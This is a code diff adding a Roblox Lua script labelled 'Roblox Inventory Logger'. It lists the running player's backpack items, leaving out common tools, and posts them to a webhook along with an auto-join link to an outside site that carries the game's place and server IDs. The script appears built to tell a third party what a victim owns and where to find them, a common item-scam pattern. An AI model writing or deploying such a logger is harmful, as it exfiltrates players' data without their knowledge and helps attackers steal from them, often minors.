@@ -1,0 +1,61 @@
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer:WaitForChild("Backpack")
+
+local items = {}
+for _, tool in ipairs(Backpack:GetChildren()) do
+    local name = tool.Name:lower()
+    if not (
+        name:find("trowel")
+        or name:find("shovel")
+        or name:find("sprinkler")
+        or name:find("egg")
+        or name:find("rod")
+        or name:find("value")
+    ) then
+        table.insert(items, "**• " .. tool.Name .. "**")
+    end
+end
+local itemText = (#items > 0) and table.concat(items, "\n") or "__No valid items found.__"
+
+local autoJoinLink = string.format(
+    "https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s",
+    tostring(game.PlaceId),
+    tostring(game.JobId)
+)
+
+local embedData = {
+    ["username"] = "Roblox Logger",
+    ["embeds"] = {{
+        ["title"] = "__" .. LocalPlayer.Name .. "'s Backpack Contents__", 
+        ["description"] = itemText,
+        ["color"] = 65280,
+        ["footer"] = {
+            ["text"] = "Roblox Inventory Logger"
+        },
+        ["fields"] = {{
+            ["name"] = "__Join Roblox Server__",
+            ["value"] = "[**Click here to auto-join**](" .. autoJoinLink .. ")"
+        }}
+    }}
+}
+
+local success, err = pcall(function()
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(embedData)
+    })
+end)
+
+if success then
+    print("Webhook sent with enhanced formatting and filters.")
+else
+    warn("Failed to send webhook:", err)
+end
